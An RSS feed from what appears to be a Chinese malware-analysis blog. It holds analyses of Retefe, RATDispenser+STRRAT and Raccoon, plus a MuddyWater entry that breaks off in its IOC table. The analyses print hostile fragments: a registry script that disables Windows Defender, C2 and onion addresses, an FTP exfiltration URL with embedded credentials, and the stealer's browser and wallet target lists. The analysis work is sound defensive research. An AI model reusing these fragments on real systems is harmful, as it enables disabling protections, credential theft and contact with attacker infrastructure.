<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Mediums on alee</title>
		<link>https://www.a1ee.cn/medium/</link>
		<description>Recent content in Mediums on alee</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<lastBuildDate>Mon, 28 Mar 2022 13:59:05 +0800</lastBuildDate>
		<atom:link href="https://www.a1ee.cn/medium/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Retefe</title>
			<link>https://www.a1ee.cn/medium/retefe/</link>
			<pubDate>Mon, 28 Mar 2022 13:59:05 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/retefe/</guid>
			<description>Retefe 样本分析 样本信息 Retefe是一种Windows银行木马，它还可以使用Windows PowerShell将其他恶意软件下载并安装到系统上。</description>
			<content type="html"><![CDATA[<h1 id="retefe-样本分析">Retefe 样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p><code>Retefe</code>是一种<code>Windows</code>银行木马，它还可以使用<code>Windows PowerShell</code>将其他恶意软件下载并安装到系统上。它的主要功能是协助攻击者窃取网上银行网站的凭据。它通常针对瑞士银行。恶意软件二进制文件本身主要是一个<code>Javascript</code>文件的释放器组件，该文件构建一个<code>PowerShell</code>文件，该文件又将多个工具加载到主机上，包括：<code>7zip</code>和<code>TOR</code>。<code>PowerShell</code>安装一个新的根证书，然后通过<code>TOR</code>将所有流量转发到攻击者控制的主机，以有效地进行<code>MITM TLS</code>流量。</p>
<p><strong>IOC</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">9bdc837b0ecdf2aac509e33b52531ac5d95b12558b71db8083b044afc7aedf94</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">f0a8c72af4f0a8656f7b2fc53f64b2fa6a6a42b6</td>
</tr>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">9b8771374f02f0357e23b312b6793a86</td>
</tr>
</tbody>
</table>
<h2 id="样本分析">样本分析</h2>
<p>样本是一个<code>Javascript</code>文件，文件经过了一些混淆，但<code>eval</code>函数很明显：</p>
<p><img src="/retefe_images/367224816226655.png" alt=""></p>
<p>通过构建一个本地包含文件来打印<code>eval</code>函数的加载内容：</p>
<p><img src="/retefe_images/184185016246821.png" alt=""></p>
<p>测试用的<code>js</code>中则将<code>eval</code>替换成<code>console.log</code>：</p>
<p><img src="/retefe_images/431135116239490.png" alt=""></p>
<p>然后我们就得到了一个隐藏的代码：</p>
<p><img src="/retefe_images/207135216236045.png" alt=""></p>
<p>从结构上看，这部分代码也是一个<code>eval</code>加载：</p>
<p><img src="/retefe_images/269222009220363.png" alt=""></p>
<p>同样的以<code>console.log</code>替换<code>eval</code>，我们得到了第二份加载代码：</p>
<p><img src="/retefe_images/423882109238789.png" alt=""></p>
<p>这个部分也是同样的<code>eval</code>：</p>
<p><img src="/retefe_images/388592209226656.png" alt=""></p>
<p>同样的以<code>console.log</code>替换<code>eval</code>，我们得到了第三份加载代码：</p>
<p><img src="/retefe_images/257712309246822.png" alt=""></p>
<p>第三份加载看起来正常多了，我们将其美化一下：</p>
<p><img src="/retefe_images/20001610231800.png" alt=""></p>
<p>里面包含了一些<code>base64</code>编码的内容，和一些函数类。</p>
<p><code>Help</code>中提供二进制文件写入、随机数生成、随机字符串生成、字符过滤：</p>
<p><img src="/retefe_images/176803010249680.png" alt=""></p>
<p><code>C_IE</code>类提供了针对网络设置的一些功能：</p>
<p><img src="/retefe_images/293193210247284.png" alt=""></p>
<p>通过访问以下站点获取本机的公网<code>IP</code>：</p>
<pre tabindex="0"><code>http://api.ipify.org/
http://icanhazip.com/
</code></pre><p>修改注册表<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoDetect</code>为<code>0</code>，关闭自动检测脚本；</p>
<p>配置注册表<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL</code>为<code>http://127.0.0.1:5555/{Help.GenStr(8)}.js?ip={GetIp()}</code>，设置代理脚本。</p>
<p>其中存在一条赋值命令：<code>var bData = Base64.decode(arrayList.ps);</code>，然后将其保存在<code>%TEMP%</code>路径下，调用<code>powershell -ep Unrestricted -f</code>执行，<code>Base64.decode(arrayList.ps)</code>解密后代码如下：</p>
<p><img src="/retefe_images/63342114226027.png" alt=""></p>
<p>该<code>powershell</code>脚本的主要功能是证书添加：</p>
<p><img src="/retefe_images/501172014244786.png" alt=""></p>
<p>添加的证书则是<code>arrayList.cert</code>的解密内容：</p>
<p><img src="/retefe_images/117832214248467.png" alt=""></p>
<p>接下来是针对<code>firefox</code>的脚本配置：</p>
<p><img src="/retefe_images/597272714243603.png" alt=""></p>
<p>同样存在一个本地文件生成及执行：</p>
<p><img src="/retefe_images/597362814237149.png" alt=""></p>
<p>解密后的主要功能也是证书导入：</p>
<p><img src="/retefe_images/328063114230283.png" alt=""></p>
<p>导入函数与<code>IE</code>略有不同：</p>
<p><img src="/retefe_images/169743314220813.png" alt=""></p>
<p><code>C_TP</code>类同样是生成<code>powershell</code>脚本并执行：</p>
<p><img src="/retefe_images/435210515223317.png" alt=""></p>
<p>脚本功能则是下载<code>7zip</code>、<code>TOR</code>和<code>socat</code>，然后用<code>socat</code>转发流量到<code>tor</code>；</p>
<p>下载 <code>7zip</code>：<code>https://chocolatey.org/7za.exe</code></p>
<p><img src="/retefe_images/508333415225758.png" alt=""></p>
<p>下载<code>taskscheduler</code>：<code>https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg</code></p>
<p><img src="/retefe_images/493634415252713.png" alt=""></p>
<p>函数执行流程：</p>
<p><img src="/retefe_images/152260915232264.png" alt=""></p>
<p><code>tor</code>下载地址如下：</p>
<pre tabindex="0"><code>https://torproject.urown.net/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
https://dist.torproject.org/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
https://torproject.mirror.metalgamer.eu/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
https://tor.ybti.net/dist/torbrowser/7.0.6/tor-win32-0.3.1.7.zip
</code></pre><p><code>sockt</code>下载地址如下：</p>
<pre tabindex="0"><code>https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip
</code></pre><p><code>DOMAIN</code>列表如下：</p>
<pre tabindex="0"><code>igs67efmlcucq57u.onion
jotetnnmfzb42sdw.onion
ou47twzxgnicn7ga.onion
aulqkm5upaqmto3i.onion
</code></pre><p>在整个调用过程中，依次执行了浏览器进程杀死，安装证书，检查安装情况并上传<code>log</code>：</p>
<p><img src="/retefe_images/532925715234926.png" alt=""></p>
<p>在<code>Func_LOG</code>函数中存在一处解密<code>arrayList.pslog</code>的行为，最终解密后的核心代码如下：</p>
<p><img src="/retefe_images/502285915224224.png" alt=""></p>
<p><code>CheckInstall</code>函数主要功能为收集当前主机信息，检查浏览器代理脚本情况：</p>
<p><img src="/retefe_images/45160116220475.png" alt=""></p>
<p><code>UploadLog</code>函数则是上传日志到目标<code>FTP</code>服务器：<code>ftp://rolf.buehlmann:Ridima65@82.220.2.66/web/sxerzere</code></p>
<p><img src="/retefe_images/308920216220614.png" alt=""></p>
<h2 id="参考资料">参考资料</h2>
<pre tabindex="0"><code>https://app.any.run/tasks/741aa9bc-8dce-44a9-b806-01f1b1f92cdd/
https://www.youtube.com/watch?v=g8_t1WfObok
</code></pre>]]></content>
		</item>
		
		<item>
			<title>RATDispenser&#43;STRRAT</title>
			<link>https://www.a1ee.cn/medium/ratdispenser&#43;strrat/</link>
			<pubDate>Mon, 28 Mar 2022 13:53:10 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/ratdispenser&#43;strrat/</guid>
			<description>RATDispenser + STRRAT 样本分析 样本信息 RATDispenser用于在启动辅助恶意软件以建立对受感染设备的控制之前在系统上获得初始立足点。调查发现RATDis</description>
			<content type="html"><![CDATA[<h1 id="ratdispenser--strrat-样本分析">RATDispenser + STRRAT 样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p><code>RATDispenser</code>用于在启动辅助恶意软件以建立对受感染设备的控制之前在系统上获得初始立足点。调查发现<code>RATDispenser</code>主要用作投放器（在 94% 的分析样本中），这意味着恶意软件不会通过网络通信来传递恶意负载。恶意软件家族的多样性（其中许多可以从地下市场免费购买或下载），以及恶意软件运营商放弃其有效载荷的偏好，表明<code>RATDispenser</code>的作者可能在恶意软件即服务的商业模式下运营。</p>
<p>本次分析的<code>RATDispenser</code>样本释放的是<code>STRRAT</code>恶意载荷，<code>STRRAT</code>是一种基于<code>Java</code>的<code>RAT</code>，它广泛使用插件来为攻击者提供完全的远程访问，以及凭据窃取、密钥记录和其他插件。<code>RAT</code>的重点是通过键盘记录窃取浏览器和电子邮件客户端的凭据以及密码。</p>
<p><strong>ioc</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">57f40bda9c26cac45157ae7502cceecd</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">6af4aa184cb1eb93feb2f3c75cd482fab518c316</td>
</tr>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">026b19fdc75b76cd696be8a3447a5d23a944a7f99000e7fae1fa3f6148913ff3</td>
</tr>
<tr>
<td style="text-align:left">C2</td>
<td style="text-align:left">147.182.174.188 [str-master.pw]</td>
</tr>
</tbody>
</table>
<h2 id="样本分析">样本分析</h2>
<h3 id="样本释放">样本释放</h3>
<p>该样本采用的是外挂<code>js</code>形式，打开<code>js</code>代码可以看到一些混淆和解密函数：</p>
<p><img src="/ratdispenser+strrat_images/330631410220355.png" alt=""></p>
<p>为了便于阅读，首先美化一下代码：</p>
<p><img src="/ratdispenser+strrat_images/446622910238781.png" alt=""></p>
<p>从其中提取出核心代码，可以看到最终解密出来的内容如下：</p>
<p><img src="/ratdispenser+strrat_images/459573210226648.png" alt=""></p>
<h3 id="二次释放">二次释放</h3>
<p>按照执行流程将进行一次<code>base64解码</code>然后用<code>eval</code>加载到内存中，解码后美化得出如下数据：</p>
<p><img src="/ratdispenser+strrat_images/146293610246814.png" alt=""></p>
<p>首先会新建一个脚本文件用于关闭<code>Windows Defender</code>：</p>
<pre tabindex="0"><code>Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender]
&#34;DisableAntiSpyware&#34;=dword:00000001
</code></pre><p><img src="/ratdispenser+strrat_images/16173316247278.png" alt=""></p>
<p>然后解密释放本地文件到<code>%temp%</code>、<code>%appdata%</code>：</p>
<p><img src="/ratdispenser+strrat_images/478242616220356.png" alt=""></p>
<h3 id="strrat-分析">STRRAT 分析</h3>
<p>最终获取到随机命名的<code>jar</code>文件：</p>
<p><img src="/ratdispenser+strrat_images/76883316226649.png" alt=""></p>
<h4 id="反混淆">反混淆</h4>
<p>其中大量引用了<code>StringBuilder()</code>符合<code>STRRAT</code>特征，由于字符串经过了混淆，接下来使用<a href="https://github.com/java-deobfuscator/deobfuscator">java-deobfuscator</a>进行反混淆。</p>
<p>首先新建一个<code>detect.yml</code>来设定检测路径：</p>
<pre tabindex="0"><code>input: xskush.jar
detect: true
</code></pre><p>然后使用命令：<code>java -jar deobfuscator.jar --config detect.yml</code> ，检测混淆方式：</p>
<p><img src="/ratdispenser+strrat_images/234154316246815.png" alt=""></p>
<p>从上面可以得出混淆方式为：<code>com.javadeobfuscator.deobfuscator.transformers.allatori.StringEncryptionTransformer</code></p>
<p>新建一个<code>config.yml</code>，指定输出文件名及混淆方式：</p>
<pre tabindex="0"><code>input: xskush.jar
output: xskush_output.jar
transformers:
  - com.javadeobfuscator.deobfuscator.transformers.allatori.StringEncryptionTransformer
</code></pre><p>执行命令：<code>java -jar deobfuscator.jar --config config.yml</code>，生成去混淆后的文件：</p>
<p><img src="/ratdispenser+strrat_images/350844017239484.png" alt=""></p>
<h4 id="分析">分析</h4>
<p>在<code>main</code>函数中，会检测部分<code>jar</code>文件是否存在：</p>
<p><img src="/ratdispenser+strrat_images/32752115220357.png" alt=""></p>
<p>寻找上下文发现其下载链接如下：</p>
<pre tabindex="0"><code>https://repo1.maven.org/maven2/net/java/dev/jna/jna/5.5.0/jna-5.5.0.jar
https://repo1.maven.org/maven2/net/java/dev/jna/jna-platform/5.5.0/jna-platform-5.5.0.jar
https://repo1.maven.org/maven2/org/xerial/sqlite-jdbc/3.14.2.1/sqlite-jdbc-3.14.2.1.jar
https://github.com/kristian/system-hook/releases/download/3.5/system-hook-3.5.jar
</code></pre><p><img src="/ratdispenser+strrat_images/27712215238783.png" alt=""></p>
<p>向下发现<code>C2</code>节点配置代码，由于<code>arrayOfString1</code>为空，最终的<code>C2</code>为<code>http://str-master.pw/strigoi/server/ping.php?lid=***</code>：</p>
<p><img src="/ratdispenser+strrat_images/189973215226650.png" alt=""></p>
<p>观察其它类，发现了一些命令执行代码：</p>
<p><img src="/ratdispenser+strrat_images/300105215246816.png" alt=""></p>
<p>获取进程和启动文件列表，窃取缓存密码等等操作：</p>
<p><img src="/ratdispenser+strrat_images/85945315239485.png" alt=""></p>
<p>还配备了按键记录：</p>
<p><img src="/ratdispenser+strrat_images/168015415236040.png" alt=""></p>
<p>操作注册表功能：</p>
<p><img src="/ratdispenser+strrat_images/95325515231794.png" alt=""></p>
<p>获取空闲时间：</p>
<p><img src="/ratdispenser+strrat_images/266725515249674.png" alt=""></p>
<h2 id="参考资料">参考资料</h2>
<pre tabindex="0"><code>https://threatresearch.ext.hp.com/javascript-malware-dispensing-rats-into-the-wild/
https://www.jaiminton.com/reverse-engineering/strrat#
https://app.any.run/tasks/0c4909de-827d-4164-9ee8-0cbffe97aef5/
</code></pre>]]></content>
		</item>
		
		<item>
			<title>Raccoon</title>
			<link>https://www.a1ee.cn/medium/raccoon/</link>
			<pubDate>Mon, 28 Mar 2022 13:49:48 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/raccoon/</guid>
			<description>Raccoon 样本分析 1. 样本信息 Raccoon是一种信息窃取类型恶意软件，可作为恶意软件即服务使用。它可以通过订阅获得，每月收费 200 美元。Raccoon恶</description>
			<content type="html"><![CDATA[<h1 id="raccoon-样本分析">Raccoon 样本分析</h1>
<h2 id="1-样本信息">1. 样本信息</h2>
<p><code>Raccoon</code>是一种信息窃取类型恶意软件，可作为恶意软件即服务使用。它可以通过订阅获得，每月收费 200 美元。<code>Raccoon</code>恶意软件已经感染了超过 100,000 台设备，并成为 2019 年地下论坛上被提及最多的病毒之一。</p>
<p><strong>ioc</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">f1521ff38743ca05cc8c6f25cd95309c</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">ebb54174674901b68474ae44944fbe5283d56398</td>
</tr>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">1a79ac5d13c3c8ab8fc5b8d7e512065f512a2d81e61b199902a0ad0f380a2256</td>
</tr>
<tr>
<td style="text-align:left">C2</td>
<td style="text-align:left">91.219.236.49</td>
</tr>
</tbody>
</table>
<h2 id="2-样本分析">2. 样本分析</h2>
<h3 id="21-空间申请">2.1. 空间申请</h3>
<p><code>ida</code>载入样本，从主函数往下发现其调用<code>GlobalAlloc</code>在堆中申请空间：</p>
<p><img src="/raccoon_images/272533116226447.png" alt=""></p>
<p>通过计算或动态调试可知<code>sizeBytes</code>大小为<code>0x4DBD0</code>：</p>
<p><img src="/raccoon_images/201873516239282.png" alt=""></p>
<h3 id="22-数据拷贝">2.2. 数据拷贝</h3>
<p>然后会将本地<code>0x407B58</code>地址处的数据逐字节拷贝到刚才申请的堆空间中：</p>
<p><img src="/raccoon_images/235383816235837.png" alt=""></p>
<p>数据的内容如下：</p>
<p><img src="/raccoon_images/443304016231591.png" alt=""></p>
<h3 id="23-修改虚拟空间保护">2.3. 修改虚拟空间保护</h3>
<p>通过<code>GetProcAddress</code>获取<code>kernel32.dll</code>中<code>&amp;byte_479098</code>字符串的函数地址，然后调用该函数使申请的堆空间可读可写可执行。<code>&amp;byte_479098</code>所对应的字符串可通过计算或动态调试得知为<code>VirtualProtect</code>：</p>
<p><img src="/raccoon_images/393444516249471.png" alt=""></p>
<h3 id="24-解密释放数据">2.4. 解密释放数据</h3>
<p><code>handleAddress</code>处拷贝的数据进行解密后，便跳转到<code>handleAddress</code>进行执行：</p>
<p><img src="/raccoon_images/463394814238581.png" alt=""></p>
<p>解密方式如下：</p>
<p><img src="/raccoon_images/120514814220155.png" alt=""></p>
<h3 id="25-第一次执行虚拟内存代码">2.5. 第一次执行虚拟内存代码</h3>
<p>在申请内存空间时，空间句柄保存在<code>handleAddress</code>中，当解密完数据后，<code>EIP</code>将指向<code>handleAddress</code>（因申请空间存在随机性，复现时内存地址亦存在差异）：</p>
<p><img src="/raccoon_images/416212115239283.png" alt=""></p>
<p>通过动态调试跟踪执行，发现第一个<code>call</code>函数的主要功能是获取<code>API</code>函数地址：<code>GlobalAlloc</code>、<code>GetLastError</code>、<code>Sleep</code>、<code>VirtualAlloc</code>、<code>CreateToolhelp32Snapshot</code>、<code>Module32First</code>、<code>CloseHandle</code>；第二个<code>call</code>函数则包含了一些有趣的东西：</p>
<p><img src="/raccoon_images/238080310220158.png" alt=""></p>
<p>在内存<code>dataAddress</code>中存在一个加密数据块，其中存储着恶意代码，下方第一个红框则是对该部分的密钥进行计算，第二个红框是解密过程（获取密钥再<code>xor</code>解密），第三个红框是判断是否全部解密（解密长度大小为<code>0x4D1F1</code>）：</p>
<p><img src="/raccoon_images/93741010238584.png" alt=""></p>
<p>当解密完成后，<code>dataAddress</code>数据块内容如下：</p>
<p><img src="/raccoon_images/81982110226451.png" alt=""></p>
<p>通过<code>VirtualAlloc</code>申请一块内存<code>virtualAddress</code>，用于存储下一次解密后的数据，该解密是从<code>dataAddress</code>获取基础数据，然后解密后加载到<code>virtualAddress</code>：</p>
<p><img src="/raccoon_images/286302410246617.png" alt=""></p>
<p>当解密完成后，<code>virtualAddress</code>数据块内容如下：</p>
<p><img src="/raccoon_images/174732910239286.png" alt=""></p>
<h3 id="26-第二次执行虚拟内存代码">2.6. 第二次执行虚拟内存代码</h3>
<p>当解密完数据后，<code>EIP</code>将指向<code>virtualAddress</code>，转入其中的代码样式如下：</p>
<p><img src="/raccoon_images/228711311249475.png" alt=""></p>
<p>通过动态调试发现其中存在内存申请，并将数据拷贝到申请的内存中，数据大小为<code>0x8C800</code>：</p>
<p><img src="/raccoon_images/35581711247079.png" alt=""></p>
<p>循环加载该<code>PE</code>文件的到<code>0x400000</code>，然后释放上一个内存空间：</p>
<p><img src="/raccoon_images/261293711244581.png" alt=""></p>
<p>内存布局中呈现的节区信息如下：</p>
<p><img src="/raccoon_images/434134011225822.png" alt=""></p>
<p>最终将跳转到<code>0x43E9BE</code>继续执行：</p>
<p><img src="/raccoon_images/181574411248262.png" alt=""></p>
<h3 id="27-恶意载荷分析">2.7. 恶意载荷分析</h3>
<p>在恶意载荷内存中转拷贝过程中，将完整的<code>PE</code>文件<code>dump</code>下来进行分析，恶意载荷首先会获取当前主机用户名，创建互斥锁：</p>
<p><img src="/raccoon_images/556711717246619.png" alt=""></p>
<p>然后进行本地语言判断，如果是白名单区域的主机将退出：</p>
<p><img src="/raccoon_images/443020517238586.png" alt=""></p>
<p>提取内存中的语言白名单如下：</p>
<pre tabindex="0"><code>Russian、Ukrainian、Belarusian、Kazakh、Kyrgyz、Armenian、Tajik、Uzbek
</code></pre><p>恶意载荷将进行字符串拼凑及解码，本次解码获得的<code>Telegram</code>频道为<code>agrybirdsgamerept</code>：</p>
<pre tabindex="0"><code>http://telegin.top/agrybirdsgamerept
http://ttmirror.top/agrybirdsgamerept
http://teletele.top/agrybirdsgamerept
http://telegalive.top/agrybirdsgamerept
http://toptelete.top/agrybirdsgamerept
http://telegraf.top/agrybirdsgamerept
https://t.me/agrybirdsgamerept
</code></pre><p><img src="/raccoon_images/118234517239288.png" alt=""></p>
<p>解码获得链接后，与其中一个链接（<code>http://telegin.top/agrybirdsgamerept</code>）进行通信：</p>
<p><img src="/raccoon_images/398201716220161.png" alt=""></p>
<p>用到的<code>WinHttpOpen</code>和<code>WinHttpConnect</code>函数：</p>
<p><img src="/raccoon_images/263341816238587.png" alt=""></p>
<p>解密响应内容，获得一个链接<code>http://91.219.236.49/</code>：</p>
<p><img src="/raccoon_images/502424515246621.png" alt=""></p>
<p>获取用户名和<code>Guid</code>：</p>
<p><img src="/raccoon_images/92270916239290.png" alt=""></p>
<p>然后将<code>Guid</code>与用户名加密后，发送到<code>C2</code>：</p>
<p><img src="/raccoon_images/528492016235845.png" alt=""></p>
<p>从响应报文中解码出一个<code>json</code>格式的字符串：</p>
<p><img src="/raccoon_images/2411609220165.png" alt=""></p>
<p>从内存中提取<code>json</code>文本格式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;_id&#34;</span><span class="p">:</span> <span class="s2">&#34;4pwhxXwB3dP17SpzDPUc&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;au&#34;</span><span class="p">:</span> <span class="s2">&#34;/l/f/4pwhxXwB3dP17SpzDPUc/f986ccd7ae3990632485c23da5d654a8641da382&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ls&#34;</span><span class="p">:</span> <span class="s2">&#34;/l/f/4pwhxXwB3dP17SpzDPUc/431b842dcfe7fd233578e09291277c256e232336&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ip&#34;</span><span class="p">:</span> <span class="s2">&#34;*.*.*.*&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;location&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;country&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;country_code&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;state&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;state_code&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;city&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;zip&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;latitude&#34;</span><span class="p">:</span> <span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;longitude&#34;</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;c&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;m&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;t&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;lu&#34;</span><span class="p">:</span> <span class="kc">null</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;lu&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;rm&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;stm&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;tg&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;is_screen_enabled&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;is_history_enabled&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;depth&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;s&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;cs&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;steamstr&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;tgs&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ews&#34;</span><span class="p">:</span> <span class="p">[</span><span class="err">...</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>其中参数对应关系如下：</p>
<ul>
<li><code>id</code>：当前主机的编号；</li>
<li><code>au</code>：下载<code>SQLite3.dll</code>的地址；</li>
<li><code>ls</code>：下载窃密功能动态链接库压缩包(<code>tS1oI8aQ4.zip</code>)的地址；</li>
<li><code>location</code>：当前主机地理位置相关信息；</li>
<li><code>rm</code>：是否启用自我删除；</li>
<li><code>stm</code>：是否窃取<code>Steam</code>相关信息；</li>
<li><code>tg</code>：是否窃取<code>Telegram</code>相关信息；</li>
<li><code>s</code>：窃取的浏览器列表；</li>
<li><code>cs</code>：窃取的钱包列表；</li>
<li><code>steamstr</code>：<code>Steam</code>路径；</li>
<li><code>tgs</code>：<code>Telegram</code>路径；</li>
<li><code>ews</code>：窃取的加密货币地址；</li>
</ul>
<p>被窃取的浏览器包含：</p>
<pre tabindex="0"><code>edge、chrome、chromeBeta、chromeSxS、chromium、xpom、comodo、amigo、orbitum、bromium、brave、nichrome、rockmelt、360browser、vivaldi、go、sputnik、kometa、uran、qipSurf、epicprivacy、coccoc、centbrowser、7star、elements、torbro、suhba、saferbrowser、mustang、superbird、chedot、torch、UC Browser、QQ Browser、opera
</code></pre><p><img src="/raccoon_images/45344509238591.png" alt=""></p>
<p>被窃取的钱包包含：</p>
<pre tabindex="0"><code>binance、atomic、daedalus、electrum、electrum-ltc、electroncash、exodus、green、guarda、jaxxliberty、jaxxold、mymonero、monerogui、wasabi、ledger_live
</code></pre><p><img src="/raccoon_images/545434909226458.png" alt=""></p>
<p><code>Steam</code>与<code>Telgram</code>的地址信息如下：</p>
<p><img src="/raccoon_images/59305209246624.png" alt=""></p>
<p>被窃取的加密钱包地址包含：</p>
<pre tabindex="0"><code>meta、meta_e、brave、ronin、tronlink、bsc、MEW、guarda、Yoroi、Yoroi_e、math、math_e、equal、iwallet、jaxx、wombat、nifty、phantom、guild、saturn、liquality、terrastation、terrastation_e、keplr、neoline、polymesh、clover、sollet、iconex、temple、coin98、tezbox、khc、auromina、coinbase、cyano
</code></pre><p><img src="/raccoon_images/253135309239293.png" alt=""></p>
<h2 id="3-参考资料">3. 参考资料</h2>
<pre tabindex="0"><code>https://labs.k7computing.com/index.php/raccoon-the-info-stealer/
https://app.any.run/tasks/f877e664-3a3c-4e03-a35a-e96e079317a5/#
https://www.virustotal.com/gui/file/1a79ac5d13c3c8ab8fc5b8d7e512065f512a2d81e61b199902a0ad0f380a2256
</code></pre>]]></content>
		</item>
		
		<item>
			<title>MuddyWater</title>
			<link>https://www.a1ee.cn/medium/muddywater/</link>
			<pubDate>Mon, 28 Mar 2022 13:46:05 +0800</pubDate>
			
			<guid>https://www.a1ee.cn/medium/muddywater/</guid>
			<description>MuddyWater 样本分析 样本信息 MuddyWater是一个伊朗威胁组织，主要针对中东国家，也针对欧洲和北美国家。该组织的受害者主要集中在电信、政府（IT 服</description>
			<content type="html"><![CDATA[<h1 id="muddywater-样本分析">MuddyWater 样本分析</h1>
<h2 id="样本信息">样本信息</h2>
<p><code>MuddyWater</code>是一个伊朗威胁组织，主要针对中东国家，也针对欧洲和北美国家。该组织的受害者主要集中在电信、政府（IT 服务）和石油部门。该组织的活动以前与<code>FIN7</code>有关联，但据信该组织是一个独特的组织，可能受到间谍活动的驱使。</p>
<p>文档内容如下：</p>
<p><img src="/muddywater_images/313823013220146.png" alt=""></p>
<p><strong>ioc</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">特征值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MD5</td>
<td style="text-align:left">c9ab403bd43649b5fd57efac4bf83b7c</td>
</tr>
<tr>
<td style="text-align:left">SHA1</td>
<td style="text-align:left">d3d98b066011fea2f4f1b9eaab97b28591d50fbe</td>
</tr>
<tr>
<td style="text-align:left">SHA256</td>
<td style="text-align:left">ea24c5a8b976919d4c8c4779dc0b7ef887373f126c4732edf9023b827b4e4dc4</td>
</tr>
<tr>
<td style="text-align:left">C2</td>
